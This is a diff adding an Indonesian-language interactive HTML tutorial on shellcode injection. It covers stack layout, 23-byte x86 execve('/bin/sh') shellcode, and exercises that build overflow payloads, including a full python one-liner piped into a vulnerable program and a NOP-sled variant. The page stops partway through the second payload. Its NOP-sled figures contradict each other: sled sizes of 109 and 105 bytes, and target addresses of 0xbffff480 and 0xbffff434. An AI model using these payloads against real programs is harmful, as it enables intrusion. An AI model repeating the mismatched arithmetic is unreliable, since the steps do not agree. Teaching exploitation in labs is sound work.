@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:sans-serif;color:#1a1a1a;padding:1rem;background:#fff;max-width:720px;margin:0 auto}
+h2{font-size:17px;font-weight:500;margin-bottom:6px}
+h3{font-size:14px;font-weight:500;margin-bottom:6px}
+p{font-size:13px;line-height:1.75;color:#555}
+.nav{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:1.25rem}
+.nav-btn{padding:6px 14px;border-radius:999px;border:0.5px solid #ccc;background:#fff;color:#555;font-size:12px;cursor:pointer;transition:all .15s}
+.nav-btn.active{background:#D85A30;color:#fff;border-color:#D85A30}
+.sec{display:none}.sec.active{display:block}
+.card{background:#fff;border:0.5px solid #ddd;border-radius:12px;padding:1rem 1.25rem;margin-bottom:.75rem}
+.soal-card{background:#FAECE7;border:0.5px solid #F0997B;border-radius:12px;padding:1rem 1.25rem;margin-bottom:1.25rem}
+.step-nav{display:flex;align-items:center;gap:10px;margin-bottom:1rem}
+.step-dots{display:flex;gap:5px;flex:1;flex-wrap:wrap}
+.dot{width:9px;height:9px;border-radius:50%;background:#ccc;border:none;padding:0;cursor:pointer}
+.btn-nav{padding:6px 16px;border-radius:8px;border:0.5px solid #ccc;background:#fff;color:#1a1a1a;font-size:13px;cursor:pointer}
+.btn-nav:hover{background:#f5f5f5}
+.btn-next{background:#D85A30;color:#fff;border-color:#D85A30}
+.btn-next:hover{background:#993C1D}
+.step-label{font-size:12px;color:#999}
+.step-panel{display:none}.step-panel.active{display:block}
+.eq{font-family:monospace;background:#f5f5f5;border:0.5px solid #ddd;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block}
+.eq-hi{font-family:monospace;background:#FAECE7;border:0.5px solid #F0997B;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#4A1B0C}
+.eq-ok{font-family:monospace;background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#173404}
+.eq-danger{font-family:monospace;background:#FCEBEB;border:0.5px solid #F09595;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#501313}
+.ok{background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#27500A;margin:.4rem 0}
+.warn{background:#FAEEDA;border:0.5px solid #FAC775;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#633806;margin:.4rem 0}
+.danger{background:#FCEBEB;border:0.5px solid #F09595;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#791F1F;margin:.4rem 0}
+.note{background:#EEEDFE;border:0.5px solid #AFA9EC;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#26215C;margin:.4rem 0}
+.step-title{font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#D85A30;margin-bottom:8px}
+.badge{display:inline-block;padding:2px 10px;border-radius:999px;font-size:11px;font-weight:500;margin-bottom:8px;background:#FAECE7;color:#712B13}
+.tbl{width:100%;border-collapse:collapse;font-size:12px;margin:.5rem 0}
+.tbl th{font-weight:500;text-align:left;padding:6px 10px;background:#f5f5f5;border:0.5px solid #ddd;color:#555}
+.tbl td{padding:6px 10px;border:0.5px solid #ddd;font-family:monospace;font-size:11px}
+.hi-row td{background:#FCEBEB;color:#791F1F}
+.ok-row td{background:#EAF3DE;color:#27500A}
+.warn-row td{background:#FAEEDA;color:#633806}
+.coral-row td{background:#FAECE7;color:#712B13}
+.big-ans{font-size:16px;font-weight:500;font-family:monospace;color:#D85A30}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:480px){.grid2{grid-template-columns:1fr}}
+.code-block{background:#1a1a2e;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:12px;color:#a8ff78;line-height:1.9;margin:.4rem 0;word-break:break-all}
+.cm{color:#555}.ck{color:#64b5f6}.cs{color:#ffd700}.cn{color:#f48fb1}
+.hi{background:#3d1a1a;color:#ff6b6b;border-radius:2px;padding:0 2px}
+.ok-hi{background:#1a3d1a;color:#a8ff78;border-radius:2px;padding:0 2px}
+.yl{color:#ffd700}
+.stack-cell{padding:6px 10px;border:0.5px solid #ddd;font-family:monospace;font-size:11px;border-radius:4px;margin:2px 0;display:flex;justify-content:space-between;align-items:center}
+.sc-plain{background:#f5f5f5;color:#1a1a1a}
+.sc-shell{background:#FAECE7;color:#712B13;border-color:#F0997B}
+.sc-ret{background:#FCEBEB;color:#791F1F;border-color:#F09595;border-width:2px}
+.sc-nop{background:#EEEDFE;color:#3C3489;border-color:#AFA9EC}
+.sc-ok{background:#EAF3DE;color:#27500A;border-color:#97C459}
+.addr{font-size:10px;color:#888;font-family:monospace}
+.arrow-label{font-size:10px;color:#D85A30;font-family:monospace;font-weight:500}
+</style>
+</head>
+<body>
+
+<div style="margin-bottom:1rem">
+  <div class="badge">Binary Exploitation — Shellcode</div>
+  <h2>Menyuntikkan dan menjalankan kode mesin di memori korban</h2>
+  <p style="margin-top:4px">Shellcode adalah sekuens byte yang, kalau dieksekusi CPU, menjalankan perintah yang kita inginkan — biasanya membuka shell. Serangan shellcode menggabungkan buffer overflow (untuk injeksi) dengan kendali EIP/RIP (untuk eksekusi).</p>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showSec('konsep')">Konsep dasar</button>
+  <button class="nav-btn" onclick="showSec('soal1')">Soal 1: Injeksi dasar</button>
+  <button class="nav-btn" onclick="showSec('soal2')">Soal 2: NOP sled</button>
+  <button class="nav-btn" onclick="showSec('bytes')">Analisis byte</button>
+</div>
+
+<!-- ============================================================ -->
+<!-- KONSEP -->
+<!-- ============================================================ -->
+<div id="sec-konsep" class="sec active">
+  <div class="card">
+    <div class="step-title">Fondasi — Apa itu shellcode?</div>
+    <h3>Shellcode = instruksi mesin yang ditulis sebagai raw bytes</h3>
+    <p style="margin-bottom:.75rem">CPU tidak peduli apakah sebuah byte adalah "data" atau "kode" — ia hanya mengeksekusi apapun yang ditunjuk oleh instruction pointer (EIP/RIP). Shellcode memanfaatkan ini.</p>
+    <div class="code-block">
+<span class="cm">; Shellcode klasik x86 Linux: execve("/bin/sh", NULL, NULL)</span>
+<span class="cm">; Dalam assembly:</span>
+xor  eax, eax          <span class="cm">; eax = 0</span>
+push eax               <span class="cm">; null terminator</span>
+push 0x68732f2f        <span class="cm">; "//sh"</span>
+push 0x6e69622f        <span class="cm">; "/bin"</span>
+mov  ebx, esp          <span class="cm">; ebx = "/bin//sh"</span>
+xor  ecx, ecx          <span class="cm">; ecx = NULL</span>
+xor  edx, edx          <span class="cm">; edx = NULL</span>
+mov  al, 0x0b          <span class="cm">; syscall execve = 11</span>
+int  0x80              <span class="cm">; kernel!</span>
+
+<span class="cm">; Dalam hex bytes (yang diinjeksikan):</span>
+<span class="yl">\x31\xc0\x50\x68\x2f\x2f\x73\x68
+\x68\x2f\x62\x69\x6e\x89\xe3\x31
+\xc9\x31\xd2\xb0\x0b\xcd\x80</span>
+    </div>
+    <p style="margin:.5rem 0;font-size:12px">23 byte ini, kalau dieksekusi, membuka shell <code>/bin/sh</code> dengan hak akses program yang sedang berjalan.</p>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Fondasi — Stack dan bagaimana overflow terjadi</div>
+    <h3>Stack layout saat fungsi dipanggil</h3>
+    <p style="margin-bottom:.75rem">Setiap kali fungsi dipanggil, CPU menyimpan <strong>return address</strong> di stack — alamat instruksi berikutnya yang harus dieksekusi setelah fungsi selesai.</p>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell sc-plain"><span>... data lain ...</span><span class="addr">alamat tinggi</span></div>
+      <div class="stack-cell sc-ret"><span style="font-weight:500">RETURN ADDRESS</span><span class="arrow-label">← yang ingin kita overwrite!</span></div>
+      <div class="stack-cell sc-plain"><span>saved EBP</span><span class="addr"></span></div>
+      <div class="stack-cell sc-plain"><span>local variable 2</span><span class="addr"></span></div>
+      <div class="stack-cell sc-ok"><span>char buffer[64] ← kita tulis ke sini</span><span class="addr">alamat rendah</span></div>
+    </div>
+    <div class="danger">Kalau kita menulis lebih dari 64 byte ke buffer, kelebihan byte akan menimpa: local variables → saved EBP → RETURN ADDRESS. Kalau return address ditimpa dengan alamat shellcode kita, CPU akan loncat dan eksekusi shellcode!</div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Fondasi — Tiga komponen serangan shellcode</div>
+    <h3>Setiap serangan shellcode terdiri dari tiga bagian</h3>
+    <div style="display:flex;flex-direction:column;gap:.5rem;margin:.5rem 0">
+      <div style="padding:.6rem .85rem;background:#FAECE7;border-left:3px solid #D85A30;border-radius:0 8px 8px 0;font-size:12px">
+        <div style="font-weight:500;color:#4A1B0C;margin-bottom:3px">1. Shellcode payload</div>
+        <div style="color:#712B13">Byte-byte yang akan dieksekusi. Biasanya: execve("/bin/sh"), atau baca file, atau reverse shell.</div>
+      </div>
+      <div style="padding:.6rem .85rem;background:#FAEEDA;border-left:3px solid #EF9F27;border-radius:0 8px 8px 0;font-size:12px">
+        <div style="font-weight:500;color:#412402;margin-bottom:3px">2. Padding / NOP sled</div>
+        <div style="color:#633806">Byte-byte pengisi untuk mencapai return address. Sering diisi dengan NOP (0x90) — instruksi "tidak lakukan apa-apa, lanjut ke berikutnya".</div>
+      </div>
+      <div style="padding:.6rem .85rem;background:#FCEBEB;border-left:3px solid #E24B4A;border-radius:0 8px 8px 0;font-size:12px">
+        <div style="font-weight:500;color:#501313;margin-bottom:3px">3. Return address (overwrite)</div>
+        <div style="color:#791F1F">Alamat di mana shellcode kita berada. Menimpa return address asli sehingga CPU loncat ke shellcode kita.</div>
+      </div>
+    </div>
+    <div class="note">Struktur payload: [SHELLCODE][PADDING hingga return addr][ALAMAT SHELLCODE]</div>
+  </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- SOAL 1 -->
+<!-- ============================================================ -->
+<div id="sec-soal1" class="sec">
+
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#D85A30;margin-bottom:6px">Soal 1 — Shellcode Injection Dasar</div>
+  <h2 style="color:#4A1B0C">Hitung offset dan susun payload!</h2>
+  <p style="color:#712B13;margin-top:6px;margin-bottom:.75rem">Diberikan program C berikut yang berjalan di x86 Linux (32-bit) tanpa proteksi (no ASLR, no NX, no canary). Susun payload untuk mengeksekusi shellcode!</p>
+  <div class="code-block">
+<span class="ck">#include</span> <span class="cs">&lt;stdio.h&gt;</span>
+<span class="ck">#include</span> <span class="cs">&lt;string.h&gt;</span>
+
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">32</span>];          <span class="cm">// buffer 32 byte</span>
+    gets(buf);             <span class="cm">// ← BERBAHAYA! tidak cek panjang</span>
+    printf(<span class="cs">"Input: %s\n"</span>, buf);
+}
+
+<span class="ck">int</span> main() {
+    vuln();
+    <span class="ck">return</span> <span class="cn">0</span>;
+}
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #F0997B;margin-top:.75rem">
+    <div style="color:#888;margin-bottom:4px">Info tambahan yang diberikan:</div>
+    <div>- Buffer di alamat:       <span style="color:#D85A30">0xbffff4a0</span></div>
+    <div>- Return address ada di:  <span style="color:#791F1F">0xbffff4c4</span> (offset 36 dari awal buffer)</div>
+    <div>- Shellcode yang dipakai: <span style="color:#27500A">23 byte execve("/bin/sh")</span></div>
+    <div>- Shellcode bytes:        <span style="color:#27500A">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80</span></div>
+  </div>
+  <p style="color:#712B13;font-size:12px;margin-top:.5rem">Pertanyaan: Susun payload lengkap (dalam hex bytes) untuk mengeksekusi shellcode!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="s1-prev" onclick="prevStep('s1')" disabled>Prev</button>
+  <div class="step-dots" id="s1-dots"></div>
+  <span class="step-label" id="s1-counter">1 / 7</span>
+  <button class="btn-nav btn-next" id="s1-next" onclick="nextStep('s1')">Next</button>
+</div>
+
+<!-- S1 STEP 0 -->
+<div class="step-panel active" id="s1-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Pahami layout stack</div>
+    <h3>Visualisasi stack fungsi vuln()</h3>
+    <p style="margin-bottom:.75rem">Saat <code>vuln()</code> dipanggil, stack terlihat seperti ini (alamat dari bawah ke atas):</p>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell" style="background:#FCEBEB;border-color:#F09595;border-width:2px">
+        <span style="font-weight:500">RETURN ADDRESS (4 byte)</span>
+        <span class="addr">0xbffff4c4</span>
+      </div>
+      <div class="stack-cell sc-plain">
+        <span>saved EBP (4 byte)</span>
+        <span class="addr">0xbffff4c0</span>
+      </div>
+      <div class="stack-cell sc-ok">
+        <span>buf[31] ... buf[0] (32 byte total)</span>
+        <span class="addr">0xbffff4a0</span>
+      </div>
+    </div>
+    <p style="font-size:12px;margin-top:.5rem">Jarak dari <code>buf[0]</code> ke return address:</p>
+    <span class="eq">0xbffff4c4 - 0xbffff4a0 = 0x24 = 36 byte</span>
+    <div class="note">Kita perlu menulis 36 byte sebelum sampai ke return address. Byte ke-37, 38, 39, 40 adalah return address baru yang akan menimpa yang asli.</div>
+  </div>
+</div>
+
+<!-- S1 STEP 1 -->
+<div class="step-panel" id="s1-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Hitung struktur payload</div>
+    <h3>Berapa byte shellcode, berapa byte padding?</h3>
+    <p style="margin-bottom:.75rem">Kita tahu:</p>
+    <table class="tbl">
+      <tr><th>Komponen</th><th>Ukuran</th><th>Keterangan</th></tr>
+      <tr class="coral-row"><td>Shellcode</td><td>23 byte</td><td>execve("/bin/sh") payload</td></tr>
+      <tr class="warn-row"><td>Padding (NOP/junk)</td><td>36 - 23 = 13 byte</td><td>Mengisi sisa sampai return addr</td></tr>
+      <tr class="hi-row"><td>Return address</td><td>4 byte</td><td>Alamat shellcode kita (little-endian)</td></tr>
+      <tr><td><strong>Total</strong></td><td><strong>40 byte</strong></td><td></td></tr>
+    </table>
+    <p style="margin:.75rem 0 .4rem;font-size:12px">Kita akan menaruh shellcode di awal buffer. Maka return address yang kita tulis = alamat awal buffer = <code>0xbffff4a0</code>.</p>
+    <span class="eq">Struktur payload:
+[23 byte shellcode][13 byte NOP padding][4 byte return address]
+= total 40 byte</span>
+    <div class="ok">Saat fungsi return, CPU membaca return address baru = 0xbffff4a0, loncat ke sana, dan mengeksekusi shellcode!</div>
+  </div>
+</div>
+
+<!-- S1 STEP 2 -->
+<div class="step-panel" id="s1-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Susun bagian 1: shellcode bytes</div>
+    <h3>23 byte pertama = shellcode execve</h3>
+    <div class="code-block">
+<span class="cm">; Shellcode 23 byte (execve /bin/sh):</span>
+<span class="yl">\x31\xc0</span>       <span class="cm">; xor eax, eax</span>
+<span class="yl">\x50</span>           <span class="cm">; push eax (null)</span>
+<span class="yl">\x68\x2f\x2f\x73\x68</span>  <span class="cm">; push "//sh"</span>
+<span class="yl">\x68\x2f\x62\x69\x6e</span>  <span class="cm">; push "/bin"</span>
+<span class="yl">\x89\xe3</span>       <span class="cm">; mov ebx, esp</span>
+<span class="yl">\x31\xc9</span>       <span class="cm">; xor ecx, ecx</span>
+<span class="yl">\x31\xd2</span>       <span class="cm">; xor edx, edx</span>
+<span class="yl">\xb0\x0b</span>       <span class="cm">; mov al, 11 (execve syscall)</span>
+<span class="yl">\xcd\x80</span>       <span class="cm">; int 0x80 (syscall!)</span>
+    </div>
+    <p style="font-size:12px;margin-top:.5rem">Hitung manual: 2+1+5+5+2+2+2+2+2 = 23 byte ✓</p>
+    <div class="note">Shellcode ini tidak boleh mengandung byte <code>\x00</code> (null byte) karena <code>gets()</code> atau <code>strcpy()</code> akan berhenti membaca saat menemukan null byte!</div>
+  </div>
+</div>
+
+<!-- S1 STEP 3 -->
+<div class="step-panel" id="s1-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Susun bagian 2: padding NOP</div>
+    <h3>13 byte NOP = \x90 × 13</h3>
+    <p style="margin-bottom:.75rem">NOP = No Operation = instruksi CPU yang tidak melakukan apa-apa selain increment EIP ke instruksi berikutnya. Byte-nya selalu <code>0x90</code>.</p>
+    <div class="code-block">
+<span class="cm">; 13 byte NOP padding:</span>
+<span class="yl">\x90\x90\x90\x90\x90\x90\x90
+\x90\x90\x90\x90\x90\x90</span>
+    </div>
+    <p style="font-size:12px;margin-top:.5rem">Mengapa pakai NOP bukan byte random? Karena NOP aman — kalau CPU tidak sengaja mulai eksekusi dari tengah NOP sled, ia akan slide terus sampai ke shellcode. Ini membuat serangan lebih reliabel.</p>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell sc-shell"><span>[byte 0–22] SHELLCODE 23 byte</span><span class="addr">0xbffff4a0</span></div>
+      <div class="stack-cell sc-nop"><span>[byte 23–35] NOP ×13</span><span class="addr">0xbffff4b7</span></div>
+      <div class="stack-cell sc-ret"><span>[byte 36–39] RETURN ADDRESS baru</span><span class="addr">0xbffff4c4</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- S1 STEP 4 -->
+<div class="step-panel" id="s1-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Susun bagian 3: return address (little-endian!)</div>
+    <h3>Return address = 0xbffff4a0, ditulis little-endian</h3>
+    <p style="margin-bottom:.75rem">x86 menggunakan format <strong>little-endian</strong> — byte terkecil (LSB) ditulis duluan. Jadi 0xbffff4a0 ditulis sebagai:</p>
+    <span class="eq">0xbffff4a0 dalam little-endian:
+LSB dulu → a0, f4, ff, bf
+
+\xa0\xf4\xff\xbf</span>
+    <div class="grid2" style="margin:.75rem 0">
+      <div style="padding:.6rem;background:#FCEBEB;border:0.5px solid #F09595;border-radius:8px">
+        <p style="font-size:11px;font-weight:500;color:#791F1F;margin-bottom:4px">SALAH (big-endian)</p>
+        <p style="font-size:11px;font-family:monospace;color:#A32D2D">\xbf\xff\xf4\xa0</p>
+        <p style="font-size:11px;color:#A32D2D">CPU akan baca alamat 0xbffff4a0 dari balik → loncat ke tempat salah!</p>
+      </div>
+      <div style="padding:.6rem;background:#EAF3DE;border:0.5px solid #97C459;border-radius:8px">
+        <p style="font-size:11px;font-weight:500;color:#27500A;margin-bottom:4px">BENAR (little-endian)</p>
+        <p style="font-size:11px;font-family:monospace;color:#3B6D11">\xa0\xf4\xff\xbf</p>
+        <p style="font-size:11px;color:#3B6D11">CPU membaca 4 byte ini dan menginterpretasikan sebagai 0xbffff4a0 ✓</p>
+      </div>
+    </div>
+    <div class="note">Aturan little-endian: balik urutannya per byte. 0x<strong>bf</strong><strong>ff</strong><strong>f4</strong><strong>a0</strong> → \xa0\xf4\xff\xbf</div>
+  </div>
+</div>
+
+<!-- S1 STEP 5 -->
+<div class="step-panel" id="s1-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Gabungkan: payload lengkap</div>
+    <h3>Susun ketiga bagian menjadi satu payload</h3>
+    <div class="code-block">
+<span class="cm"># Payload lengkap (40 byte total):</span>
+
+<span class="cm"># Bagian 1: Shellcode (23 byte)</span>
+<span class="yl">\x31\xc0\x50\x68\x2f\x2f\x73\x68
+\x68\x2f\x62\x69\x6e\x89\xe3\x31
+\xc9\x31\xd2\xb0\x0b\xcd\x80</span>
+
+<span class="cm"># Bagian 2: NOP padding (13 byte)</span>
+<span class="yl">\x90\x90\x90\x90\x90\x90\x90
+\x90\x90\x90\x90\x90\x90</span>
+
+<span class="cm"># Bagian 3: Return address little-endian (4 byte)</span>
+<span class="hi">\xa0\xf4\xff\xbf</span>
+
+<span class="cm"># Dalam satu baris (untuk dikirim ke program):</span>
+python3 -c "import sys; sys.stdout.buffer.write(
+  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68'
+  b'\x68\x2f\x62\x69\x6e\x89\xe3\x31'
+  b'\xc9\x31\xd2\xb0\x0b\xcd\x80'
+  b'\x90' * 13
+  b'\xa0\xf4\xff\xbf'
+)" | ./vulnerable_program
+    </div>
+    <div class="ok" style="margin-top:.5rem">40 byte ini, kalau berhasil masuk ke buffer, akan menimpa return address dan mengeksekusi /bin/sh!</div>
+  </div>
+</div>
+
+<!-- S1 STEP 6 -->
+<div class="step-panel" id="s1-step-6">
+  <div class="card">
+    <div class="step-title">Langkah 7 — Trace eksekusi serangan</div>
+    <h3>Apa yang terjadi step by step saat payload dijalankan</h3>
+    <div style="display:flex;flex-direction:column;gap:.4rem;font-size:12px;margin:.5rem 0">
+      <div style="padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;margin-bottom:2px">1. gets(buf) membaca 40 byte payload</div>
+        <div style="color:#555">Buffer hanya 32 byte → kelebihan 8 byte menimpa saved EBP dan return address</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;margin-bottom:2px">2. vuln() selesai → CPU baca return address</div>
+        <div style="color:#555">Return address asli sudah ditimpa dengan 0xbffff4a0</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;margin-bottom:2px">3. CPU loncat ke 0xbffff4a0</div>
+        <div style="color:#555">Tepat di awal buffer kita — di sana ada shellcode!</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#FAECE7;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;color:#4A1B0C;margin-bottom:2px">4. Shellcode dieksekusi → execve("/bin/sh")</div>
+        <div style="color:#712B13">Shell terbuka! Attacker mendapat shell dengan hak akses program tersebut.</div>
+      </div>
+    </div>
+
+    <div style="text-align:center;padding:1.25rem;background:#1a1a2e;border-radius:12px;margin:.75rem 0">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Hasil serangan</div>
+      <div class="big-ans" style="color:#a8ff78">$ whoami → root</div>
+      <div style="font-size:12px;color:#555;margin-top:4px">Shell terbuka dengan hak akses program</div>
+    </div>
+
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #D85A30">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Ringkasan menyusun payload shellcode</p>
+      <p style="font-size:12px">1. Hitung offset ke return address: alamat_ret - alamat_buffer</p>
+      <p style="font-size:12px">2. Struktur: [shellcode][NOP padding = offset - len(shellcode)][ret_addr]</p>
+      <p style="font-size:12px">3. Return address ditulis little-endian (balik byte-nya)</p>
+      <p style="font-size:12px">4. Shellcode tidak boleh mengandung null byte (\x00)</p>
+      <p style="font-size:12px">5. Total payload = offset + 4 byte (ukuran pointer)</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end soal1 -->
+
+<!-- ============================================================ -->
+<!-- SOAL 2: NOP SLED -->
+<!-- ============================================================ -->
+<div id="sec-soal2" class="sec">
+
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#D85A30;margin-bottom:6px">Soal 2 — NOP Sled Attack</div>
+  <h2 style="color:#4A1B0C">Alamat stack tidak pasti — gunakan NOP sled!</h2>
+  <p style="color:#712B13;margin-top:6px;margin-bottom:.75rem">Sekarang kita tidak tahu persis alamat buffer (ASLR ringan — stack bergeser sedikit). Tapi kita tahu buffer ada di sekitar <code>0xbffff400</code>±128. Gunakan NOP sled untuk memperbesar target!</p>
+  <div class="code-block">
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">128</span>];   <span class="cm">// buffer lebih besar</span>
+    gets(buf);
+}
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #F0997B;margin-top:.75rem">
+    <div style="color:#888;margin-bottom:4px">Info:</div>
+    <div>- Buffer size: <span style="color:#D85A30">128 byte</span></div>
+    <div>- Offset ke return address: <span style="color:#791F1F">136 byte</span> (128 buffer + 4 EBP + 4 alignment)</div>
+    <div>- Perkiraan alamat stack: <span style="color:#27500A">~0xbffff400</span> (±128 byte karena env vars)</div>
+    <div>- Shellcode: <span style="color:#27500A">23 byte</span> (sama seperti soal 1)</div>
+  </div>
+  <p style="color:#712B13;font-size:12px;margin-top:.5rem">Pertanyaan: Susun payload dengan NOP sled yang cukup besar untuk meningkatkan probabilitas sukses!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="s2-prev" onclick="prevStep('s2')" disabled>Prev</button>
+  <div class="step-dots" id="s2-dots"></div>
+  <span class="step-label" id="s2-counter">1 / 5</span>
+  <button class="btn-nav btn-next" id="s2-next" onclick="nextStep('s2')">Next</button>
+</div>
+
+<!-- S2 STEP 0 -->
+<div class="step-panel active" id="s2-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Mengapa alamat stack tidak pasti?</div>
+    <h3>Stack bergeser karena environment variables dan arguments</h3>
+    <p style="margin-bottom:.75rem">Posisi stack bergantung pada: panjang environment variables, jumlah argumen program, path executable, dll. Meski ASLR dimatikan, stack bisa bergeser 16–256 byte antar eksekusi.</p>
+    <div class="code-block">
+<span class="cm"># Tanpa ASLR, stack tetap bisa bergeser:</span>
+$ ./vuln                 <span class="cm">→ buf di 0xbffff400</span>
+$ env VAR=aaaa ./vuln    <span class="cm">→ buf di 0xbffff3f8  (bergeser -8)</span>
+$ ./vuln arg1 arg2       <span class="cm">→ buf di 0xbffff3e0  (bergeser -32)</span>
+    </div>
+    <div class="danger">Kalau kita tebak alamat salah 1 byte pun, shellcode tidak dieksekusi — CPU akan crash atau eksekusi instruksi acak.</div>
+    <div class="note" style="margin-top:.4rem">Solusi: isi buffer dengan banyak NOP sebelum shellcode. Kalau CPU "jatuh" di mana saja dalam NOP sled, ia akan slide terus sampai ke shellcode.</div>
+  </div>
+</div>
+
+<!-- S2 STEP 1 -->
+<div class="step-panel" id="s2-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Konsep NOP sled</div>
+    <h3>NOP sled = "landasan" yang menggiring ke shellcode</h3>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell" style="background:#FCEBEB;border-color:#F09595;border-width:2px">
+        <span>RETURN ADDRESS: 0xbffff480 (tengah NOP sled)</span><span class="addr">+136</span>
+      </div>
+      <div class="stack-cell sc-plain"><span>saved EBP</span><span class="addr">+132</span></div>
+      <div class="stack-cell sc-shell"><span>SHELLCODE (23 byte)</span><span class="addr">+109 s/d +131</span></div>
+      <div class="stack-cell sc-nop"><span>NOP NOP NOP ... (109 byte sled)</span><span class="addr">+0 s/d +108</span></div>
+    </div>
+    <p style="font-size:12px;margin:.5rem 0">Kalau CPU loncat ke MANA SAJA dalam zona NOP (0xbffff400 s/d 0xbffff46c), ia akan slide dan sampai ke shellcode. Target kita bukan 1 titik — tapi 109 byte!</p>
+    <div class="ok">Window sukses meningkat dari 1 alamat tepat → 109 byte area. Probabilitas sukses: ~85% kalau stack bergeser ±64 byte.</div>
+  </div>
+</div>
+
+<!-- S2 STEP 2 -->
+<div class="step-panel" id="s2-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Hitung struktur payload NOP sled</div>
+    <h3>Susun tiga bagian dengan buffer 128 byte</h3>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Komponen</th><th>Ukuran</th><th>Posisi di buffer</th></tr>
+      <tr class="warn-row"><td>NOP sled (\x90)</td><td>128 - 23 = 105 byte</td><td>byte 0–104</td></tr>
+      <tr class="coral-row"><td>Shellcode</td><td>23 byte</td><td>byte 105–127</td></tr>
+      <tr><td>Padding (untuk EBP)</td><td>8 byte (junk)</td><td>byte 128–135</td></tr>
+      <tr class="hi-row"><td>Return address baru</td><td>4 byte</td><td>byte 136–139</td></tr>
+      <tr><td><strong>Total</strong></td><td><strong>140 byte</strong></td><td></td></tr>
+    </table>
+    <p style="font-size:12px">Return address yang kita pakai: titik tengah NOP sled ≈ 0xbffff480 (perkiraan buffer + 128/2).</p>
+    <span class="eq">Alamat target = perkiraan_buffer_addr + (ukuran_NOP_sled / 2)
+                  ≈ 0xbffff400 + 52
+                  = 0xbffff434</span>
+    <div class="note">Dengan mengincar tengah NOP sled, kita maksimalkan toleransi ke dua arah — baik kalau stack bergeser naik maupun turun.</div>
+  </div>
+</div>
+
+<!-- S2 STEP 3 -->
+<div class="step-panel" id="s2-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Payload lengkap NOP sled</div>
+    <h3>Susun 140 byte payload</h3>
+    <div class="code-block">
+<span class="cm"># Payload dengan NOP sled (140 byte total):</span>
+
+<span class="cm"># Bagian 1: NOP sled (105 byte)</span>
+<span class="yl">\x90</span> × <span class="cn">105</span>
+
+<span class="cm"># Bagian 2: Shellcode (23 byte)</span>
+<span class="yl">\x31\xc0\x50\x68\x2f\x2f\x73\x68
+\x68\x2f\x62\x69\x6e\x89\xe3\x31
+\xc9\x31\xd2\xb0\x0b\xcd\x80</span>
+
+<span class="cm"># Bagian 3: Padding untuk EBP (8 byte)</span>
+<span class="yl">\x41\x41\x41\x41\x41\x41\x41\x41</span>  <span class="cm"># "AAAAAAAA"</span>
+
